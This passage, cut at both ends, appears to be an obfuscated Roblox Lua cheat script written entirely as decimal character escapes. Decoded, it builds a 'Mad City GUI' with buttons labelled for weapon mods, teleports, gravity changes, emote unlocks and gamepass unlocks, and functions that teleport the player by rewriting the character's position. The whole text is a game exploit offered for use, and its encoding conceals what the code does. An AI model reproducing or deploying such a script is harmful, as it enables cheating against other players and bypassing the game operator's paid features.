51','\54','\52','\53','\56','\50','\52','\44','\48','\44','\48','\46','\56','\55','\54','\52','\48','\55','\53','\54','\52','\44','\48','\41','\67','\46','\83','\105','\122','\101','\61','\85','\68','\105','\109','\50','\46','\110','\101','\119','\40','\48','\44','\54','\53','\44','\48','\44','\49','\54','\41','\67','\46','\70','\111','\110','\116','\61','\69','\110','\117','\109','\46','\70','\111','\110','\116','\46','\71','\111','\116','\104','\97','\109','\83','\101','\109','\105','\98','\111','\108','\100','\59','\67','\46','\84','\101','\120','\116','\61','\34','\65','\75','\52','\55','\32','\77','\111','\100','\34','\67','\46','\84','\101','\120','\116','\67','\111','\108','\111','\114','\51','\61','\67','\111','\108','\111','\114','\51','\46','\110','\101','\119','\40','\49','\44','\49','\44','\49','\41','\67','\46','\84','\101','\120','\116','\83','\99','\97','\108','\101','\100','\61','\116','\114','\117','\101','\59','\67','\46','\84','\101','\120','\116','\83','\105','\122','\101','\61','\49','\52','\59','\67','\46','\84','\101','\120','\116','\87','\114','\97','\112','\112','\101','\100','\61','\116','\114','\117','\101','\59','\68','\46','\78','\97','\109','\101','\61','\34','\103','\114','\101','\110','\97','\100','\101','\109','\111','\100','\34','\68','\46','\80','\97','\114','\101','\110','\116','\61','\111','\59','\68','\46','\66','\97','\99','\107','\103','\114','\111','\117','\110','\100','\67','\111','\108','\111','\114','\51','\61','\67','\111','\108','\111','\114','\51','\46','\110','\101','\119','\40','\49','\44','\48','\46','\54','\54','\54','\54','\54','\55','\44','\48','\41','\68','\46','\66','\111','\114','\100','\101','\114','\67','\111','\108','\111','\114','\51','\61','\67','\111','\108','\111','\114','\51','\46','\110','\101','\119','\40','\49','\44','\49','\44','\49','\41','\68','\46','\80','\111','\115','\105','\116','\105','\111','\110','\61','\85','\68','\105','\109','\50','\46','\110','\101','\119','\40','\48','\46','\49','\55','\51','\54','\52','\53','\56','\50','\52','\44','\48','\44','\48','\46','\57','\51','\57','\56','\53','\57','\51','\51','\49','\44','\48','\41','\68','\46','\83','\105','\122','\101','\61','\85','\68','\105','\109','\50','\46','\110','\101','\119','\40','\48','\44','\54','\53','\44','\48','\44','\49','\54','\41','\68','\46','\70','\111','\110','\116','\61','\69','\110','\117','\109','\46','\70','\111','\110','\116','\46','\71','\111','\116','\104','\97','\109','\83','\101','\109','\105','\98','\111','\108','\100','\59','\68','\46','\84','\101','\120','\116','\61','\34','\71','\114','\101','\110','\97','\100','\101','\32','\77','\111','\100','\34','\68','\46','\84','\101','\120','\116','\67','\111','\108','\111','\114','\51','\61','\67','\111','\108','\111','\114','\51','\46','\110','\101','\119','\40','\49','\44','\49','\44','\49','\41','\68','\46','\84','\101','\120','\116','\83','\99','\97','\108','\101','\100','\61','\116','\114','\117','\101','\59','\68','\46','\84','\101','\120','\116','\83','\105','\122','\101','\61','\49','\52','\59','\68','\46','\84','\101','\120','\116','\87','\114','\97','\112','\112','\101','\100','\61','\116','\114','\117','\101','\59','\69','\46','\78','\97','\109','\101','\61','\34','\116','\105','\116','\108','\101','\34','\69','\46','\80','\97','\114','\101','\110','\116','\61','\98','\59','\69','\46','\66','\97','\99','\107','\103','\114','\111','\117','\110','\100','\67','\111','\108','\111','\114','\51','\61','\67','\111','\108','\111','\114','\51','\46','\110','\101','\119','\40','\49','\44','\48','\46','\54','\54','\54','\54','\54','\55','\44','\48','\41','\69','\46','\66','\111','\114','\100','\101','\114','\83','\105','\122','\101','\80','\105','\120','\101','\108','\61','\50','\59','\69','\46','\80','\111','\115','\105','\116','\105','\111','\110','\61','\85','\68','\105','\109','\50','\46','\110','\101','\119','\40','\48','\44','\48','\44','\45','\48','\46','\50','\53','\53','\48','\52','\54','\51','\51','\56','\44','\48','\41','\69','\46','\83','\105','\122','\101','\61','\85','\68','\105','\109','\50','\46','\110','\101','\119','\40','\48','\44','\51','\56','\52','\44','\48','\44','\53','\48','\41','\69','\46','\70','\111','\110','\116','\61','\69','\110','\117','\109','\46','\70','\111','\110','\116','\46','\71','\111','\116','\104','\97','\109','\83','\101','\109','\105','\98','\111','\108','\100','\59','\69','\46','\84','\101','\120','\116','\61','\34','\77','\97','\100','\32','\67','\105','\116','\121','\32','\71','\85','\73','\32','\66','\121','\32','\78','\101','\98','\35','\55','\52','\52','\52','\34','\69','\46','\84','\101','\120','\116','\67','\111','\108','\111','\114','\51','\61','\67','\111','\108','\111','\114','\51','\46','\110','\101','\119','\40','\49','\44','\49','\44','\49','\41','\69','\46','\84','\101','\120','\116','\83','\99','\97','\108','\101','\100','\61','\116','\114','\117','\101','\59','\69','\46','\84','\101','\120','\116','\83','\105','\122','\101','\61','\49','\52','\59','\69','\46','\84','\101','\120','\116','\87','\114','\97','\112','\112','\101','\100','\61','\116','\114','\117','\101','\59','\70','\46','\78','\97','\109','\101','\61','\34','\116','\101','\108','\101','\112','\111','\114','\116','\115','\108','\97','\98','\114','\108','\34','\70','\46','\80','\97','\114','\101','\110','\116','\61','\98','\59','\70','\46','\66','\97','\99','\107','\103','\114','\111','\117','\110','\100','\67','\111','\108','\111','\114','\51','\61','\67','\111','\108','\111','\114','\51','\46','\110','\101','\119','\40','\48','\46','\49','\57','\50','\49','\53','\55','\44','\48','\46','\49','\57','\50','\49','\53','\55','\44','\48','\46','\49','\57','\50','\49','\53','\55','\41','\70','\46','\66','\111','\114','\100','\101','\114','\67','\111','\108','\111','\114','\51','\61','\67','\111','\108','\111','\114','\51','\46','\110','\101','\119','\40','\48','\46','\49','\56','\56','\50','\51','\53','\44','\48','\46','\49','\56','\56','\50','\51','\53','\44','\48','\46','\49','\56','\56','\50','\51','\53','\41','\70','\46','\80','\111','\115','\105','\116','\105','\111','\110','\61','\85','\68','\105','\109','\50','\46','\110','\101','\119','\40','\48','\46','\55','\51','\57','\53','\56','\51','\52','\51','\51','\44','\48','\44','\48','\44','\48','\41','\70','\46','\83','\105','\122','\101','\61','\85','\68','\105','\109','\50','\46','\110','\101','\119','\40','\48','\44','\49','\48','\48','\44','\48','\44','\50','\53','\41','\70','\46','\70','\111','\110','\116','\61','\69','\110','\117','\109','\46','\70','\111','\110','\116','\46','\71','\111','\116','\104','\97','\109','\83','\101','\109','\105','\98','\111','\108','\100','\59','\70','\46','\84','\101','\120','\116','\61','\34','\84','\101','\108','\101','\112','\111','\114','\116','\115','\34','\70','\46','\84','\101','\120','\116','\67','\111','\108','\111','\114','\51','\61','\67','\111','\108','\111','\114','\51','\46','\110','\101','\119','\40','\49','\44','\49','\44','\49','\41','\70','\46','\84','\101','\120','\116','\83','\105','\122','\101','\61','\49','\52','\59','\70','\46','\84','\101','\120','\116','\83','\116','\114','\111','\107','\101','\67','\111','\108','\111','\114','\51','\61','\67','\111','\108','\111','\114','\51','\46','\110','\101','\119','\40','\49','\44','\49','\44','\49','\41','\71','\46','\78','\97','\109','\101','\61','\34','\102','\117','\110','\99','\116','\111','\110','\108','\97','\98','\101','\108','\34','\71','\46','\80','\97','\114','\101','\110','\116','\61','\98','\59','\71','\46','\66','\97','\99','\107','\103','\114','\111','\117','\110','\100','\67','\111','\108','\111','\114','\51','\61','\67','\111','\108','\111','\114','\51','\46','\110','\101','\119','\40','\48','\46','\49','\57','\50','\49','\53','\55','\44','\48','\46','\49','\57','\50','\49','\53','\55','\44','\48','\46','\49','\57','\50','\49','\53','\55','\41','\71','\46','\66','\111','\114','\100','\101','\114','\67','\111','\108','\111','\114','\51','\61','\67','\111','\108','\111','\114','\51','\46','\110','\101','\119','\40','\48','\46','\49','\56','\56','\50','\51','\53','\44','\48','\46','\49','\56','\56','\50','\51','\53','\44','\48','\46','\49','\56','\56','\50','\51','\53','\41','\71','\46','\83','\105','\122','\101','\61','\85','\68','\105','\109','\50','\46','\110','\101','\119','\40','\48','\44','\49','\56','\52','\44','\48','\44','\50','\53','\41','\71','\46','\70','\111','\110','\116','\61','\69','\110','\117','\109','\46','\70','\111','\110','\116','\46','\71','\111','\116','\104','\97','\109','\83','\101','\109','\105','\98','\111','\108','\100','\59','\71','\46','\84','\101','\120','\116','\61','\34','\70','\117','\110','\99','\116','\105','\111','\110','\115','\34','\71','\46','\84','\101','\120','\116','\67','\111','\108','\111','\114','\51','\61','\67','\111','\108','\111','\114','\51','\46','\110','\101','\119','\40','\49','\44','\49','\44','\49','\41','\71','\46','\84','\101','\120','\116','\83','\105','\122','\101','\61','\49','\52','\59','\71','\46','\84','\101','\120','\116','\83','\116','\114','\111','\107','\101','\67','\111','\108','\111','\114','\51','\61','\67','\111','\108','\111','\114','\51','\46','\110','\101','\119','\40','\49','\44','\49','\44','\49','\41','\72','\46','\78','\97','\109','\101','\61','\34','\116','\112','\116','\111','\34','\72','\46','\80','\97','\114','\101','\110','\116','\61','\98','\59','\72','\46','\66','\97','\99','\107','\103','\114','\111','\117','\110','\100','\67','\111','\108','\111','\114','\51','\61','\67','\111','\108','\111','\114','\51','\46','\110','\101','\119','\40','\49','\44','\48','\46','\54','\54','\54','\54','\54','\55','\44','\48','\41','\72','\46','\66','\111','\114','\100','\101','\114','\67','\111','\108','\111','\114','\51','\61','\67','\111','\108','\111','\114','\51','\46','\110','\101','\119','\40','\49','\44','\49','\44','\49','\41','\72','\46','\80','\111','\115','\105','\116','\105','\111','\110','\61','\85','\68','\105','\109','\50','\46','\110','\101','\119','\40','\48','\46','\49','\55','\55','\56','\49','\50','\53','\48','\50','\44','\48','\44','\48','\46','\53','\55','\57','\52','\53','\51','\50','\57','\44','\48','\41','\72','\46','\83','\105','\122','\101','\61','\85','\68','\105','\109','\50','\46','\110','\101','\119','\40','\48','\44','\54','\53','\44','\48','\44','\49','\54','\41','\72','\46','\70','\111','\110','\116','\61','\69','\110','\117','\109','\46','\70','\111','\110','\116','\46','\71','\111','\116','\104','\97','\109','\83','\101','\109','\105','\98','\111','\108','\100','\59','\72','\46','\84','\101','\120','\116','\61','\34','\84','\101','\108','\101','\112','\111','\114','\116','\34','\72','\46','\84','\101','\120','\116','\67','\111','\108','\111','\114','\51','\61','\67','\111','\108','\111','\114','\51','\46','\110','\101','\119','\40','\49','\44','\49','\44','\49','\41','\72','\46','\84','\101','\120','\116','\83','\99','\97','\108','\101','\100','\61','\116','\114','\117','\101','\59','\72','\46','\84','\101','\120','\116','\83','\105','\122','\101','\61','\49','\52','\59','\72','\46','\84','\101','\120','\116','\87','\114','\97','\112','\112','\101','\100','\61','\116','\114','\117','\101','\59','\73','\46','\78','\97','\109','\101','\61','\34','\116','\112','\66','\79','\88','\34','\73','\46','\80','\97','\114','\101','\110','\116','\61','\98','\59','\73','\46','\66','\97','\99','\107','\103','\114','\111','\117','\110','\100','\67','\111','\108','\111','\114','\51','\61','\67','\111','\108','\111','\114','\51','\46','\110','\101','\119','\40','\48','\46','\51','\52','\57','\48','\50','\44','\48','\46','\51','\52','\57','\48','\50','\44','\48','\46','\51','\52','\57','\48','\50','\41','\73','\46','\80','\111','\115','\105','\116','\105','\111','\110','\61','\85','\68','\105','\109','\50','\46','\110','\101','\119','\40','\48','\46','\48','\55','\51','\54','\52','\53','\56','\51','\48','\50','\44','\48','\44','\48','\46','\52','\53','\55','\54','\50','\53','\56','\54','\54','\44','\48','\41','\73','\46','\83','\105','\122','\101','\61','\85','\68','\105','\109','\50','\46','\110','\101','\119','\40','\48','\44','\49','\52','\54','\44','\48','\44','\49','\54','\41','\73','\46','\70','\111','\110','\116','\61','\69','\110','\117','\109','\46','\70','\111','\110','\116','\46','\71','\111','\116','\104','\97','\109','\83','\101','\109','\105','\98','\111','\108','\100','\59','\73','\46','\80','\108','\97','\99','\101','\104','\111','\108','\100','\101','\114','\84','\101','\120','\116','\61','\34','\69','\110','\116','\101','\114','\32','\85','\115','\101','\114','\110','\97','\109','\101','\32','\72','\101','\114','\101','\46','\46','\46','\34','\73','\46','\84','\101','\120','\116','\61','\34','\34','\73','\46','\84','\101','\120','\116','\67','\111','\108','\111','\114','\51','\61','\67','\111','\108','\111','\114','\51','\46','\110','\101','\119','\40','\48','\44','\48','\44','\48','\41','\73','\46','\84','\101','\120','\116','\83','\99','\97','\108','\101','\100','\61','\116','\114','\117','\101','\59','\73','\46','\84','\101','\120','\116','\83','\105','\122','\101','\61','\49','\52','\59','\73','\46','\84','\101','\120','\116','\87','\114','\97','\112','\112','\101','\100','\61','\116','\114','\117','\101','\59','\74','\46','\78','\97','\109','\101','\61','\34','\103','\114','\97','\118','\105','\116','\121','\34','\74','\46','\80','\97','\114','\101','\110','\116','\61','\98','\59','\74','\46','\66','\97','\99','\107','\103','\114','\111','\117','\110','\100','\67','\111','\108','\111','\114','\51','\61','\67','\111','\108','\111','\114','\51','\46','\110','\101','\119','\40','\49','\44','\48','\46','\54','\54','\54','\54','\54','\55','\44','\48','\41','\74','\46','\66','\111','\114','\100','\101','\114','\67','\111','\108','\111','\114','\51','\61','\67','\111','\108','\111','\114','\51','\46','\110','\101','\119','\40','\49','\44','\49','\44','\49','\41','\74','\46','\80','\111','\115','\105','\116','\105','\111','\110','\61','\85','\68','\105','\109','\50','\46','\110','\101','\119','\40','\48','\46','\50','\56','\52','\53','\56','\51','\51','\51','\44','\48','\44','\48','\46','\49','\56','\56','\53','\57','\48','\51','\49','\56','\44','\48','\41','\74','\46','\83','\105','\122','\101','\61','\85','\68','\105','\109','\50','\46','\110','\101','\119','\40','\48','\44','\54','\53','\44','\48','\44','\49','\54','\41','\74','\46','\70','\111','\110','\116','\61','\69','\110','\117','\109','\46','\70','\111','\110','\116','\46','\71','\111','\116','\104','\97','\109','\83','\101','\109','\105','\98','\111','\108','\100','\59','\74','\46','\84','\101','\120','\116','\61','\34','\71','\114','\97','\118','\105','\116','\121','\58','\32','\79','\70','\70','\34','\74','\46','\84','\101','\120','\116','\67','\111','\108','\111','\114','\51','\61','\67','\111','\108','\111','\114','\51','\46','\110','\101','\119','\40','\49','\44','\49','\44','\49','\41','\74','\46','\84','\101','\120','\116','\83','\99','\97','\108','\101','\100','\61','\116','\114','\117','\101','\59','\74','\46','\84','\101','\120','\116','\83','\105','\122','\101','\61','\49','\52','\59','\74','\46','\84','\101','\120','\116','\87','\114','\97','\112','\112','\101','\100','\61','\116','\114','\117','\101','\59','\75','\46','\78','\97','\109','\101','\61','\34','\103','\117','\110','\109','\111','\100','\108','\97','\98','\101','\108','\34','\75','\46','\80','\97','\114','\101','\110','\116','\61','\98','\59','\75','\46','\66','\97','\99','\107','\103','\114','\111','\117','\110','\100','\67','\111','\108','\111','\114','\51','\61','\67','\111','\108','\111','\114','\51','\46','\110','\101','\119','\40','\48','\46','\49','\57','\50','\49','\53','\55','\44','\48','\46','\49','\57','\50','\49','\53','\55','\44','\48','\46','\49','\57','\50','\49','\53','\55','\41','\75','\46','\66','\111','\114','\100','\101','\114','\67','\111','\108','\111','\114','\51','\61','\67','\111','\108','\111','\114','\51','\46','\110','\101','\119','\40','\48','\46','\49','\56','\56','\50','\51','\53','\44','\48','\46','\49','\56','\56','\50','\51','\53','\44','\48','\46','\49','\56','\56','\50','\51','\53','\41','\75','\46','\80','\111','\115','\105','\116','\105','\111','\110','\61','\85','\68','\105','\109','\50','\46','\110','\101','\119','\40','\48','\46','\52','\55','\57','\49','\54','\54','\55','\55','\54','\44','\48','\44','\48','\44','\48','\41','\75','\46','\83','\105','\122','\101','\61','\85','\68','\105','\109','\50','\46','\110','\101','\119','\40','\48','\44','\49','\48','\48','\44','\48','\44','\50','\53','\41','\75','\46','\70','\111','\110','\116','\61','\69','\110','\117','\109','\46','\70','\111','\110','\116','\46','\71','\111','\116','\104','\97','\109','\83','\101','\109','\105','\98','\111','\108','\100','\59','\75','\46','\84','\101','\120','\116','\61','\34','\87','\101','\97','\112','\111','\110','\32','\77','\111','\100','\34','\75','\46','\84','\101','\120','\116','\67','\111','\108','\111','\114','\51','\61','\67','\111','\108','\111','\114','\51','\46','\110','\101','\119','\40','\49','\44','\49','\44','\49','\41','\75','\46','\84','\101','\120','\116','\83','\105','\122','\101','\61','\49','\52','\59','\75','\46','\84','\101','\120','\116','\83','\116','\114','\111','\107','\101','\67','\111','\108','\111','\114','\51','\61','\67','\111','\108','\111','\114','\51','\46','\110','\101','\119','\40','\49','\44','\49','\44','\49','\41','\76','\46','\78','\97','\109','\101','\61','\34','\101','\109','\111','\116','\101','\117','\110','\108','\111','\99','\107','\34','\76','\46','\80','\97','\114','\101','\110','\116','\61','\98','\59','\76','\46','\66','\97','\99','\107','\103','\114','\111','\117','\110','\100','\67','\111','\108','\111','\114','\51','\61','\67','\111','\108','\111','\114','\51','\46','\110','\101','\119','\40','\49','\44','\48','\46','\54','\54','\54','\54','\54','\55','\44','\48','\41','\76','\46','\66','\111','\114','\100','\101','\114','\67','\111','\108','\111','\114','\51','\61','\67','\111','\108','\111','\114','\51','\46','\110','\101','\119','\40','\49','\44','\49','\44','\49','\41','\76','\46','\80','\111','\115','\105','\116','\105','\111','\110','\61','\85','\68','\105','\109','\50','\46','\110','\101','\119','\40','\48','\46','\48','\55','\51','\54','\52','\53','\56','\52','\53','\49','\44','\48','\44','\48','\46','\49','\56','\56','\53','\57','\48','\51','\52','\56','\44','\48','\41','\76','\46','\83','\105','\122','\101','\61','\85','\68','\105','\109','\50','\46','\110','\101','\119','\40','\48','\44','\54','\53','\44','\48','\44','\49','\54','\41','\76','\46','\70','\111','\110','\116','\61','\69','\110','\117','\109','\46','\70','\111','\110','\116','\46','\71','\111','\116','\104','\97','\109','\83','\101','\109','\105','\98','\111','\108','\100','\59','\76','\46','\84','\101','\120','\116','\61','\34','\85','\110','\108','\111','\99','\107','\32','\65','\108','\108','\32','\69','\109','\111','\116','\101','\115','\34','\76','\46','\84','\101','\120','\116','\67','\111','\108','\111','\114','\51','\61','\67','\111','\108','\111','\114','\51','\46','\110','\101','\119','\40','\49','\44','\49','\44','\49','\41','\76','\46','\84','\101','\120','\116','\83','\99','\97','\108','\101','\100','\61','\116','\114','\117','\101','\59','\76','\46','\84','\101','\120','\116','\83','\105','\122','\101','\61','\49','\52','\59','\76','\46','\84','\101','\120','\116','\87','\114','\97','\112','\112','\101','\100','\61','\116','\114','\117','\101','\59','\77','\46','\78','\97','\109','\101','\61','\34','\97','\117','\100','\105','\111','\66','\79','\88','\34','\77','\46','\80','\97','\114','\101','\110','\116','\61','\98','\59','\77','\46','\66','\97','\99','\107','\103','\114','\111','\117','\110','\100','\67','\111','\108','\111','\114','\51','\61','\67','\111','\108','\111','\114','\51','\46','\110','\101','\119','\40','\48','\46','\51','\52','\57','\48','\50','\44','\48','\46','\51','\52','\57','\48','\50','\44','\48','\46','\51','\52','\57','\48','\50','\41','\77','\46','\80','\111','\115','\105','\116','\105','\111','\110','\61','\85','\68','\105','\109','\50','\46','\110','\101','\119','\40','\48','\46','\48','\55','\51','\54','\52','\53','\56','\51','\48','\50','\44','\48','\44','\48','\46','\54','\57','\54','\50','\48','\52','\53','\52','\51','\44','\48','\41','\77','\46','\83','\105','\122','\101','\61','\85','\68','\105','\109','\50','\46','\110','\101','\119','\40','\48','\44','\49','\52','\54','\44','\48','\44','\49','\54','\41','\77','\46','\70','\111','\110','\116','\61','\69','\110','\117','\109','\46','\70','\111','\110','\116','\46','\71','\111','\116','\104','\97','\109','\83','\101','\109','\105','\98','\111','\108','\100','\59','\77','\46','\80','\108','\97','\99','\101','\104','\111','\108','\100','\101','\114','\84','\101','\120','\116','\61','\34','\69','\110','\116','\101','\114','\32','\65','\117','\100','\105','\111','\32','\73','\68','\32','\72','\101','\114','\101','\46','\46','\46','\34','\77','\46','\84','\101','\120','\116','\61','\34','\34','\77','\46','\84','\101','\120','\116','\67','\111','\108','\111','\114','\51','\61','\67','\111','\108','\111','\114','\51','\46','\110','\101','\119','\40','\48','\44','\48','\44','\48','\41','\77','\46','\84','\101','\120','\116','\83','\99','\97','\108','\101','\100','\61','\116','\114','\117','\101','\59','\77','\46','\84','\101','\120','\116','\83','\105','\122','\101','\61','\49','\52','\59','\77','\46','\84','\101','\120','\116','\87','\114','\97','\112','\112','\101','\100','\61','\116','\114','\117','\101','\59','\78','\46','\78','\97','\109','\101','\61','\34','\97','\117','\100','\105','\111','\34','\78','\46','\80','\97','\114','\101','\110','\116','\61','\98','\59','\78','\46','\66','\97','\99','\107','\103','\114','\111','\117','\110','\100','\67','\111','\108','\111','\114','\51','\61','\67','\111','\108','\111','\114','\51','\46','\110','\101','\119','\40','\49','\44','\48','\46','\54','\54','\54','\54','\54','\55','\44','\48','\41','\78','\46','\66','\111','\114','\100','\101','\114','\67','\111','\108','\111','\114','\51','\61','\67','\111','\108','\111','\114','\51','\46','\110','\101','\119','\40','\49','\44','\49','\44','\49','\41','\78','\46','\80','\111','\115','\105','\116','\105','\111','\110','\61','\85','\68','\105','\109','\50','\46','\110','\101','\119','\40','\48','\46','\49','\55','\55','\56','\49','\50','\53','\48','\50','\44','\48','\44','\48','\46','\56','\50','\56','\49','\56','\52','\50','\52','\55','\44','\48','\41','\78','\46','\83','\105','\122','\101','\61','\85','\68','\105','\109','\50','\46','\110','\101','\119','\40','\48','\44','\54','\53','\44','\48','\44','\49','\54','\41','\78','\46','\70','\111','\110','\116','\61','\69','\110','\117','\109','\46','\70','\111','\110','\116','\46','\71','\111','\116','\104','\97','\109','\83','\101','\109','\105','\98','\111','\108','\100','\59','\78','\46','\84','\101','\120','\116','\61','\34','\80','\108','\97','\121','\32','\86','\101','\104','\105','\99','\108','\101','\32','\82','\97','\100','\105','\111','\34','\78','\46','\84','\101','\120','\116','\67','\111','\108','\111','\114','\51','\61','\67','\111','\108','\111','\114','\51','\46','\110','\101','\119','\40','\49','\44','\49','\44','\49','\41','\78','\46','\84','\101','\120','\116','\83','\99','\97','\108','\101','\100','\61','\116','\114','\117','\101','\59','\78','\46','\84','\101','\120','\116','\83','\105','\122','\101','\61','\49','\52','\59','\78','\46','\84','\101','\120','\116','\87','\114','\97','\112','\112','\101','\100','\61','\116','\114','\117','\101','\59','\79','\46','\78','\97','\109','\101','\61','\34','\103','\97','\109','\101','\112','\97','\115','\115','\117','\110','\108','\111','\99','\107','\34','\79','\46','\80','\97','\114','\101','\110','\116','\61','\98','\59','\79','\46','\66','\97','\99','\107','\103','\114','\111','\117','\110','\100','\67','\111','\108','\111','\114','\51','\61','\67','\111','\108','\111','\114','\51','\46','\110','\101','\119','\40','\49','\44','\48','\46','\54','\54','\54','\54','\54','\55','\44','\48','\41','\79','\46','\66','\111','\114','\100','\101','\114','\67','\111','\108','\111','\114','\51','\61','\67','\111','\108','\111','\114','\51','\46','\110','\101','\119','\40','\49','\44','\49','\44','\49','\41','\79','\46','\80','\111','\115','\105','\116','\105','\111','\110','\61','\85','\68','\105','\109','\50','\46','\110','\101','\119','\40','\48','\46','\48','\55','\51','\54','\52','\53','\56','\52','\53','\49','\44','\48','\44','\48','\46','\51','\50','\53','\54','\52','\54','\49','\57','\50','\44','\48','\41','\79','\46','\83','\105','\122','\101','\61','\85','\68','\105','\109','\50','\46','\110','\101','\119','\40','\48','\44','\54','\53','\44','\48','\44','\49','\54','\41','\79','\46','\70','\111','\110','\116','\61','\69','\110','\117','\109','\46','\70','\111','\110','\116','\46','\71','\111','\116','\104','\97','\109','\83','\101','\109','\105','\98','\111','\108','\100','\59','\79','\46','\84','\101','\120','\116','\61','\34','\85','\110','\108','\111','\99','\107','\32','\71','\97','\109','\101','\112','\97','\115','\115','\101','\115','\34','\79','\46','\84','\101','\120','\116','\67','\111','\108','\111','\114','\51','\61','\67','\111','\108','\111','\114','\51','\46','\110','\101','\119','\40','\49','\44','\49','\44','\49','\41','\79','\46','\84','\101','\120','\116','\83','\99','\97','\108','\101','\100','\61','\116','\114','\117','\101','\59','\79','\46','\84','\101','\120','\116','\83','\105','\122','\101','\61','\49','\52','\59','\79','\46','\84','\101','\120','\116','\87','\114','\97','\112','\112','\101','\100','\61','\116','\114','\117','\101','\59','\80','\46','\78','\97','\109','\101','\61','\34','\99','\116','\114','\108','\116','\112','\34','\80','\46','\80','\97','\114','\101','\110','\116','\61','\98','\59','\80','\46','\66','\97','\99','\107','\103','\114','\111','\117','\110','\100','\67','\111','\108','\111','\114','\51','\61','\67','\111','\108','\111','\114','\51','\46','\110','\101','\119','\40','\49','\44','\48','\46','\54','\54','\54','\54','\54','\55','\44','\48','\41','\80','\46','\66','\111','\114','\100','\101','\114','\67','\111','\108','\111','\114','\51','\61','\67','\111','\108','\111','\114','\51','\46','\110','\101','\119','\40','\49','\44','\49','\44','\49','\41','\80','\46','\80','\111','\115','\105','\116','\105','\111','\110','\61','\85','\68','\105','\109','\50','\46','\110','\101','\119','\40','\48','\46','\50','\56','\52','\53','\56','\51','\51','\51','\44','\48','\44','\48','\46','\51','\49','\53','\52','\57','\51','\56','\56','\50','\44','\48','\41','\80','\46','\83','\105','\122','\101','\61','\85','\68','\105','\109','\50','\46','\110','\101','\119','\40','\48','\44','\54','\53','\44','\48','\44','\49','\54','\41','\80','\46','\70','\111','\110','\116','\61','\69','\110','\117','\109','\46','\70','\111','\110','\116','\46','\71','\111','\116','\104','\97','\109','\83','\101','\109','\105','\98','\111','\108','\100','\59','\80','\46','\84','\101','\120','\116','\61','\34','\67','\116','\114','\108','\32','\84','\80','\34','\80','\46','\84','\101','\120','\116','\67','\111','\108','\111','\114','\51','\61','\67','\111','\108','\111','\114','\51','\46','\110','\101','\119','\40','\49','\44','\49','\44','\49','\41','\80','\46','\84','\101','\120','\116','\83','\99','\97','\108','\101','\100','\61','\116','\114','\117','\101','\59','\80','\46','\84','\101','\120','\116','\83','\105','\122','\101','\61','\49','\52','\59','\80','\46','\84','\101','\120','\116','\87','\114','\97','\112','\112','\101','\100','\61','\116','\114','\117','\101','\59','\81','\46','\78','\97','\109','\101','\61','\34','\111','\112','\101','\110','\99','\108','\111','\115','\101','\34','\81','\46','\80','\97','\114','\101','\110','\116','\61','\97','\59','\81','\46','\66','\97','\99','\107','\103','\114','\111','\117','\110','\100','\67','\111','\108','\111','\114','\51','\61','\67','\111','\108','\111','\114','\51','\46','\110','\101','\119','\40','\49','\44','\48','\46','\54','\54','\54','\54','\54','\55','\44','\48','\41','\81','\46','\66','\111','\114','\100','\101','\114','\83','\105','\122','\101','\80','\105','\120','\101','\108','\61','\50','\59','\81','\46','\80','\111','\115','\105','\116','\105','\111','\110','\61','\85','\68','\105','\109','\50','\46','\110','\101','\119','\40','\48','\46','\55','\50','\51','\52','\56','\54','\48','\54','\54','\44','\48','\44','\48','\46','\57','\48','\52','\50','\50','\52','\50','\55','\55','\44','\48','\41','\81','\46','\83','\105','\122','\101','\61','\85','\68','\105','\109','\50','\46','\110','\101','\119','\40','\48','\44','\49','\56','\55','\44','\48','\44','\52','\56','\41','\81','\46','\70','\111','\110','\116','\61','\69','\110','\117','\109','\46','\70','\111','\110','\116','\46','\71','\111','\116','\104','\97','\109','\83','\101','\109','\105','\98','\111','\108','\100','\59','\81','\46','\84','\101','\120','\116','\61','\34','\60','\32','\79','\112','\101','\110','\32','\62','\34','\81','\46','\84','\101','\120','\116','\67','\111','\108','\111','\114','\51','\61','\67','\111','\108','\111','\114','\51','\46','\110','\101','\119','\40','\49','\44','\49','\44','\49','\41','\81','\46','\84','\101','\120','\116','\83','\99','\97','\108','\101','\100','\61','\116','\114','\117','\101','\59','\81','\46','\84','\101','\120','\116','\83','\105','\122','\101','\61','\49','\52','\59','\81','\46','\84','\101','\120','\116','\87','\114','\97','\112','\112','\101','\100','\61','\116','\114','\117','\101','\59','\102','\117','\110','\99','\116','\105','\111','\110','\32','\83','\67','\82','\73','\80','\84','\95','\66','\82','\81','\85','\56','\50','\95','\70','\65','\75','\69','\83','\67','\82','\73','\80','\84','\40','\41','\103','\101','\116','\102','\101','\110','\118','\40','\41','\46','\115','\99','\114','\105','\112','\116','\61','\73','\110','\115','\116','\97','\110','\99','\101','\46','\110','\101','\119','\40','\39','\83','\99','\114','\105','\112','\116','\39','\44','\100','\41','\108','\111','\99','\97','\108','\32','\82','\61','\115','\99','\114','\105','\112','\116','\46','\80','\97','\114','\101','\110','\116','\59','\82','\46','\77','\111','\117','\115','\101','\66','\117','\116','\116','\111','\110','\49','\67','\108','\105','\99','\107','\58','\67','\111','\110','\110','\101','\99','\116','\40','\102','\117','\110','\99','\116','\105','\111','\110','\40','\41','\103','\97','\109','\101','\46','\80','\108','\97','\121','\101','\114','\115','\46','\76','\111','\99','\97','\108','\80','\108','\97','\121','\101','\114','\46','\67','\104','\97','\114','\97','\99','\116','\101','\114','\46','\72','\117','\109','\97','\110','\111','\105','\100','\82','\111','\111','\116','\80','\97','\114','\116','\46','\67','\70','\114','\97','\109','\101','\61','\67','\70','\114','\97','\109','\101','\46','\110','\101','\119','\40','\54','\57','\48','\46','\49','\49','\53','\53','\51','\57','\53','\53','\48','\55','\56','\44','\50','\52','\46','\56','\56','\57','\51','\52','\51','\50','\54','\49','\55','\49','\57','\44','\52','\52','\54','\46','\48','\57','\54','\54','\52','\57','\49','\54','\57','\57','\50','\41','\101','\110','\100','\41','\101','\110','\100','\59','\99','\111','\114','\111','\117','\116','\105','\110','\101','\46','\114','\101','\115','\117','\109','\101','\40','\99','\111','\114','\111','\117','\116','\105','\110','\101','\46','\99','\114','\101','\97','\116','\101','\40','\83','\67','\82','\73','\80','\84','\95','\66','\82','\81','\85','\56','\50','\95','\70','\65','\75','\69','\83','\67','\82','\73','\80','\84','\41','\41','\102','\117','\110','\99','\116','\105','\111','\110','\32','\83','\67','\82','\73','\80','\84','\95','\84','\66','\89','\86','\55','\53','\95','\70','\65','\75','\69','\83','\67','\82','\73','\80','\84','\40','\41','\103','\101','\116','\102','\101','\110','\118','\40','\41','\46','\115','\99','\114','\105','\112','\116','\61','\73','\110','\115','\116','\97','\110','\99','\101','\46','\110','\101','\119','\40','\39','\83','\99','\114','\105','\112','\116','\39','\44','\